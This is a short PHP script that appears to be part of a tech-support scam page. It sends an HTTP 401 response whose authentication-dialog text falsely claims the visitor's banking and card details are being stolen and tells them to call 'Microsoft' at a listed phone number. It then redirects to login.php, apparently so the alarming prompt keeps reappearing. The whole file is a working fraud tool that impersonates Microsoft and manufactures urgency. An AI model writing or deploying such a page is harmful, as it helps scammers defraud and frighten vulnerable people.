<?php 
header('WWW-Authenticate: Basic realm="Someone Is Trying To Steal Your Banking Details, Credit Card Details & Other Logins. Please Call Microsoft At +1 833 346 9444 Immediately To Prevent Data Loss."'); 
    header("HTTP/1.1 401 Unauthorized"); 
header( 'refresh: 0; url=login.php' ); 
?>